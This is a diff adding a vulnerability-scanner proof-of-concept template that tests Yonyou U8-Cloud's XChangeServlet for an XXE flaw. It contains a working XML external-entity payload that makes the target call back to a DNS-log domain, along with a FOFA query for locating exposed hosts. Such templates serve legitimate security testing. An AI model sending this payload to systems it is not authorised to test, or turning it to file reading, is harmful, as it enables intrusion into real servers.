@@ -1,0 +1,22 @@
+id: poc-yaml-yongyou-u8cloud-xchangeservlet-xxe
+info:
+  name: 用友U8-Cloud XChangeServlet XXE漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - xxe
+  finger: 用友U8cloud
+  fofa: body="开启U8 cloud云端之旅"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /service/XChangeServlet
+  headers:
+    Content-Type: text/xml
+  data: <!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY xxe SYSTEM "http://{{.domain}}">]><r><a>&xxe;</a
+    ></r>
+  expression: status_code == 200 && contains(body,"<resultdescription>") && contains(body,"从网络读取数据流出错")
+    && reverse.Verify()
+transport: http
